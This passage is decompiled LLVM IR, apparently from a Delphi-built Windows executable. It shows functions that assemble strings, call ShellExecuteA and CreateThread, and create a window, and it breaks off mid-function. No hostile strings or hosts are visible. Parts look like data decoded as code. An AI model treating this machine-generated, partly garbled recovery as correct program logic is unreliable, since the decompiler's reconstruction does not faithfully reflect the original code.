  %0 = call i32 @"@HandleFinally"(), !insn.addr !1471
  ret i32 %0, !insn.addr !1471
}

define i32 @function_40661d() local_unnamed_addr {
dec_label_pc_40661d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1472
}

define i32 @function_40661f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1473
}

define i32 @function_406628() local_unnamed_addr {
dec_label_pc_406628:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1474
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1475
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1476
  ret i32 %4, !insn.addr !1477
}

define i32 @function_406660() local_unnamed_addr {
dec_label_pc_406660:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1478
  %esp.0.reg2mem = alloca i32, !insn.addr !1478
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1478
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1479
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1479
  br label %dec_label_pc_406668, !insn.addr !1479

dec_label_pc_406668:                              ; preds = %dec_label_pc_406668, %dec_label_pc_406660
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1480
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1480
  store i32 0, i32* %2, align 4, !insn.addr !1480
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1481
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1481
  store i32 0, i32* %4, align 4, !insn.addr !1481
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1482
  %6 = icmp eq i32 %5, 0, !insn.addr !1482
  %7 = icmp eq i1 %6, false, !insn.addr !1483
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1483
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1483
  br i1 %7, label %dec_label_pc_406668, label %dec_label_pc_40666f, !insn.addr !1483

dec_label_pc_40666f:                              ; preds = %dec_label_pc_406668
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1484
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1484
  store i32 0, i32* %9, align 4, !insn.addr !1484
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1485
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1485
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1486
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1486
  store i32 %0, i32* %13, align 4, !insn.addr !1486
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1487
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1487
  store i32 4220839, i32* %15, align 4, !insn.addr !1487
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1488
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1488
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1488
  store i32 %16, i32* %18, align 4, !insn.addr !1488
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1489
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1490
  %20 = call i32 @function_40658c(), !insn.addr !1491
  %21 = call i32 @function_4036c8(), !insn.addr !1492
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1493
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1494
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1494
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1494
  store i32 %25, i32* %24, align 4, !insn.addr !1494
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1495
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1496
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1497
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1497
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1497
  store i32 %30, i32* %29, align 4, !insn.addr !1497
  %31 = call i32 @function_4034c8(), !insn.addr !1498
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1499
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1500
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1500
  store i32 ptrtoint ([6 x i8]* @global_var_4067bc to i32), i32* %34, align 4, !insn.addr !1500
  %35 = call i32 @function_406628(), !insn.addr !1501
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1502
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1502
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1503
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1503
  store i32 ptrtoint (i32* @global_var_4067cc to i32), i32* %39, align 4, !insn.addr !1503
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1504
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1504
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1504
  store i32 %40, i32* %42, align 4, !insn.addr !1504
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1505
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1506
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1506
  store i32 0, i32* %45, align 4, !insn.addr !1506
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1507
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1507
  store i32 0, i32* %47, align 4, !insn.addr !1507
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1508
  %49 = call i32 @function_4036c8(), !insn.addr !1509
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1510
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1510
  store i32 %49, i32* %51, align 4, !insn.addr !1510
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1511
  %53 = call i32 @function_40658c(), !insn.addr !1512
  %54 = call i32 @function_4036c8(), !insn.addr !1513
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1514
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1514
  store i32 %54, i32* %56, align 4, !insn.addr !1514
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1515
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1515
  store i32 0, i32* %58, align 4, !insn.addr !1515
  %59 = call i32 @function_406584(), !insn.addr !1516
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1517
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1517
  store i32 1, i32* %61, align 4, !insn.addr !1517
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1518
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1518
  store i32 0, i32* %63, align 4, !insn.addr !1518
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1519
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1519
  store i32 0, i32* %65, align 4, !insn.addr !1519
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1520
  %67 = call i32 @function_4036c8(), !insn.addr !1521
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1522
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1522
  store i32 %67, i32* %69, align 4, !insn.addr !1522
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1523
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1523
  store i32 ptrtoint ([5 x i8]* @global_var_4067dc to i32), i32* %71, align 4, !insn.addr !1523
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1524
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1524
  store i32 0, i32* %73, align 4, !insn.addr !1524
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1525
  %75 = load i32, i32* %73, align 4, !insn.addr !1526
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1527
  store i32 4220846, i32* %69, align 4, !insn.addr !1528
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1529
  ret i32 %76, !insn.addr !1530
}

define i32 @function_4067a7() local_unnamed_addr {
dec_label_pc_4067a7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1531
  ret i32 %0, !insn.addr !1531
}

define i32 @function_4067ac() local_unnamed_addr {
dec_label_pc_4067ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1532
}

define i32 @function_4067ae(i32 %arg1) local_unnamed_addr {
dec_label_pc_4067ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1533
}

define i32 @function_4067d3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4067d3:
  %esp.1.reg2mem = alloca i32, !insn.addr !1534
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1534
  %ecx.0.reg2mem = alloca i32, !insn.addr !1534
  %esp.0.reg2mem = alloca i32, !insn.addr !1534
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1534
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1534
  store i32 %5, i32* %6, align 4, !insn.addr !1534
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1535
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1535
  %11 = add i8 %8, %10, !insn.addr !1535
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1535
  store i8 %11, i8* %12, align 1, !insn.addr !1535
  %13 = add i32 %2, 58, !insn.addr !1536
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1536
  %15 = load i8, i8* %14, align 1, !insn.addr !1536
  %16 = load i32, i32* %eax, align 4, !insn.addr !1536
  %17 = udiv i32 %16, 256, !insn.addr !1536
  %18 = trunc i32 %17 to i8, !insn.addr !1536
  %19 = add i8 %15, %18, !insn.addr !1536
  store i8 %19, i8* %14, align 1, !insn.addr !1536
  %20 = add i32 %0, 112, !insn.addr !1537
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1537
  %22 = load i8, i8* %21, align 1, !insn.addr !1537
  %23 = trunc i32 %4 to i8, !insn.addr !1537
  %24 = add i8 %22, %23, !insn.addr !1537
  store i8 %24, i8* %21, align 1, !insn.addr !1537
  %25 = trunc i32 %3 to i16, !insn.addr !1538
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1538
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1538
  %27 = load i8, i8* %7, align 4, !insn.addr !1539
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1539
  %30 = add i8 %27, %29, !insn.addr !1539
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1539
  store i8 %30, i8* %31, align 1, !insn.addr !1539
  %32 = load i8, i8* %7, align 4, !insn.addr !1540
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1540
  %35 = add i8 %32, %34, !insn.addr !1540
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1540
  store i8 %35, i8* %36, align 1, !insn.addr !1540
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1541
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1542
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1542
  br label %dec_label_pc_4067ec, !insn.addr !1542

dec_label_pc_4067ec:                              ; preds = %dec_label_pc_4067ec, %dec_label_pc_4067d3
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1543
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1543
  store i32 0, i32* %39, align 4, !insn.addr !1543
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1544
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1544
  store i32 0, i32* %41, align 4, !insn.addr !1544
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1545
  %43 = icmp eq i32 %42, 0, !insn.addr !1545
  %44 = icmp eq i1 %43, false, !insn.addr !1546
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1546
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1546
  br i1 %44, label %dec_label_pc_4067ec, label %dec_label_pc_4067f3, !insn.addr !1546

dec_label_pc_4067f3:                              ; preds = %dec_label_pc_4067ec
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1547
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1547
  store i32 0, i32* %46, align 4, !insn.addr !1547
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1548
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1548
  store i32 %37, i32* %48, align 4, !insn.addr !1548
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1549
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1549
  store i32 4221576, i32* %50, align 4, !insn.addr !1549
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1550
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1550
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1550
  store i32 %51, i32* %53, align 4, !insn.addr !1550
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1551
  %54 = call i32 @"@LStrPos"(), !insn.addr !1552
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1553
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1553
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1553
  store i32 %57, i32* %56, align 4, !insn.addr !1553
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1554
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1555
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1555
  store i32 %61, i32* %60, align 4, !insn.addr !1555
  %62 = call i32 @function_4034c8(), !insn.addr !1556
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1557
  %64 = add i32 %arg1, -1, !insn.addr !1558
  store i32 %64, i32* %eax, align 4, !insn.addr !1558
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406a6d [
    i32 0, label %dec_label_pc_406865
    i32 1, label %dec_label_pc_4069a5
    i32 2, label %dec_label_pc_406a13
  ]

dec_label_pc_406865:                              ; preds = %dec_label_pc_4067f3
  %65 = call i32 @function_4034c8(), !insn.addr !1559
  %66 = icmp slt i32 %65, 5, !insn.addr !1560
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1560
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1560
  br i1 %66, label %dec_label_pc_406a6d, label %dec_label_pc_406876, !insn.addr !1560

dec_label_pc_406876:                              ; preds = %dec_label_pc_406865
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1561
  %68 = call i32 @function_40658c(), !insn.addr !1562
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1563
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1563
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1564
  %72 = call i32 @function_40658c(), !insn.addr !1565
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1566
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1566
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1567
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1567
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1567
  store i32 %75, i32* %77, align 4, !insn.addr !1567
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1568
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1568
  store i32 ptrtoint (i32* @global_var_406aac to i32), i32* %79, align 4, !insn.addr !1568
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1569
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1569
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1569
  store i32 %80, i32* %82, align 4, !insn.addr !1569
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1570
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1571
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1571
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1572
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1572
  store i32 4221624, i32* %87, align 4, !insn.addr !1572
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1573
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1573
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1573
  store i32 %88, i32* %90, align 4, !insn.addr !1573
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1574
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1574
  store i32 4221640, i32* %92, align 4, !insn.addr !1574
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1575
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1575
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1575
  store i32 %93, i32* %95, align 4, !insn.addr !1575
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1576
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1576
  store i32 4221656, i32* %97, align 4, !insn.addr !1576
  %98 = call i32 @function_407930(), !insn.addr !1577
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1578
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1578
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1579
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1580
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1580
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1581
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1581
  store i32 %106, i32* %105, align 4, !insn.addr !1581
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1582
  %108 = call i32 @function_40658c(), !insn.addr !1583
  %109 = call i32 @"@LStrPos"(), !insn.addr !1584
  %110 = add i32 %109, -1, !insn.addr !1585
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1586
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1586
  store i32 %110, i32* %112, align 4, !insn.addr !1586
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1587
  %114 = call i32 @function_40658c(), !insn.addr !1588
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1589
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1590
  store i32 %116, i32* %112, align 4, !insn.addr !1591
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1592
  %118 = call i32 @function_40658c(), !insn.addr !1593
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1594
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1594
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1595
  %122 = call i32 @function_40658c(), !insn.addr !1596
  %123 = call i32 @function_405798(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1597
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1598
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1598
  br label %dec_label_pc_406a6d, !insn.addr !1598

dec_label_pc_4069a5:                              ; preds = %dec_label_pc_4067f3
  %124 = call i32 @function_4034c8(), !insn.addr !1599
  %125 = icmp slt i32 %124, 5, !insn.addr !1600
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1600
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1600
  br i1 %125, label %dec_label_pc_406a6d, label %dec_label_pc_4069b6, !insn.addr !1600

dec_label_pc_4069b6:                              ; preds = %dec_label_pc_4069a5
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1601
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1601
  store i32 ptrtoint ([5 x i8]* @global_var_406af8 to i32), i32* %127, align 4, !insn.addr !1601
  %128 = call i32 @function_404ae8(), !insn.addr !1602
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1603
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1603
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1604
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1604
  store i32 ptrtoint ([7 x i8]* @global_var_406b08 to i32), i32* %132, align 4, !insn.addr !1604
  %133 = call i32 @function_404ae8(), !insn.addr !1605
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1606
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1607
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1608
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1608
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1609
  %140 = call i32 @function_40658c(), !insn.addr !1610
  %141 = call i32 @function_404c40(), !insn.addr !1611
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1612
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1612
  br label %dec_label_pc_406a6d, !insn.addr !1612

dec_label_pc_406a13:                              ; preds = %dec_label_pc_4067f3
  %142 = call i32 @function_4034c8(), !insn.addr !1613
  %143 = icmp slt i32 %142, 5, !insn.addr !1614
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1614
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1614
  br i1 %143, label %dec_label_pc_406a6d, label %dec_label_pc_406a20, !insn.addr !1614

dec_label_pc_406a20:                              ; preds = %dec_label_pc_406a13
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1615
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1615
  store i32 ptrtoint ([5 x i8]* @global_var_406af8 to i32), i32* %145, align 4, !insn.addr !1615
  %146 = call i32 @function_404ae8(), !insn.addr !1616
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1617
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1617
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1618
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1618
  store i32 ptrtoint ([7 x i8]* @global_var_406b08 to i32), i32* %150, align 4, !insn.addr !1618
  %151 = call i32 @function_404ae8(), !insn.addr !1619
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1620
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1621
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1622
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1622
  %157 = call i32 @function_40658c(), !insn.addr !1623
  %158 = call i32 @function_404c40(), !insn.addr !1624
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1624
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1624
  br label %dec_label_pc_406a6d, !insn.addr !1624

dec_label_pc_406a6d:                              ; preds = %dec_label_pc_4067f3, %dec_label_pc_406a20, %dec_label_pc_406a13, %dec_label_pc_4069b6, %dec_label_pc_4069a5, %dec_label_pc_406876, %dec_label_pc_406865
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1625
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1625
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1626
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1627
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1628
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1628
  store i32 4221583, i32* %163, align 4, !insn.addr !1628
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1629
  ret i32 %164, !insn.addr !1630
}

define i32 @function_406a88() local_unnamed_addr {
dec_label_pc_406a88:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1631
  ret i32 %0, !insn.addr !1631
}

define i32 @function_406a8d() local_unnamed_addr {
dec_label_pc_406a8d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1632
}

define i32 @function_406a8f(i32 %arg1) local_unnamed_addr {
dec_label_pc_406a8f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1633
}

define i32 @function_406abb() local_unnamed_addr {
dec_label_pc_406abb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1634
}

define i32 @function_406ac3() local_unnamed_addr {
dec_label_pc_406ac3:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1635
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1635
  store i32 %1, i32* %2, align 4, !insn.addr !1635
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1636
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1636
  %7 = add i8 %4, %6, !insn.addr !1636
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1636
  store i8 %7, i8* %8, align 1, !insn.addr !1636
  %9 = load i8, i8* %3, align 4, !insn.addr !1637
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1637
  %12 = trunc i32 %11 to i8, !insn.addr !1637
  %13 = add i8 %9, %12, !insn.addr !1637
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1637
  store i8 %13, i8* %14, align 1, !insn.addr !1637
  %15 = load i32, i32* %eax, align 4, !insn.addr !1638
  ret i32 %15, !insn.addr !1638
}

define i32 @function_406aca() local_unnamed_addr {
dec_label_pc_406aca:
  %0 = call i32 @function_406b08(), !insn.addr !1639
  ret i32 %0, !insn.addr !1639
}

define i32 @function_406b06() local_unnamed_addr {
dec_label_pc_406b06:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1640
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1640
  store i8 %2, i8* %3, align 1, !insn.addr !1640
  ret i32 %0, !insn.addr !1640
}

define i32 @function_406b08() local_unnamed_addr {
dec_label_pc_406b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_406b6c, label %dec_label_pc_406b0b, !insn.addr !1641

dec_label_pc_406b0b:                              ; preds = %dec_label_pc_406b08
  %5 = icmp eq i1 %4, false, !insn.addr !1642
  br i1 %5, label %dec_label_pc_406b80, label %dec_label_pc_406b0d, !insn.addr !1642

dec_label_pc_406b0d:                              ; preds = %dec_label_pc_406b0b
  ret i32 %2, !insn.addr !1643

dec_label_pc_406b6c:                              ; preds = %dec_label_pc_406b08
  %6 = call i32 @function_4045ac(), !insn.addr !1644
  br label %dec_label_pc_406b80, !insn.addr !1645

dec_label_pc_406b80:                              ; preds = %dec_label_pc_406b6c, %dec_label_pc_406b0b
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1646
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1647
  %9 = add i32 %0, 20, !insn.addr !1648
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1648
  %11 = load i32, i32* %10, align 4, !insn.addr !1648
  %12 = add i32 %0, 16, !insn.addr !1649
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1649
  %14 = load i32, i32* %13, align 4, !insn.addr !1649
  %15 = add i32 %0, 8, !insn.addr !1650
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1650
  %17 = load i32, i32* %16, align 4, !insn.addr !1650
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1651
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1651
  ret i32 %19, !insn.addr !1652
}

define i32 @function_406bb8() local_unnamed_addr {
dec_label_pc_406bb8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1653
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1653
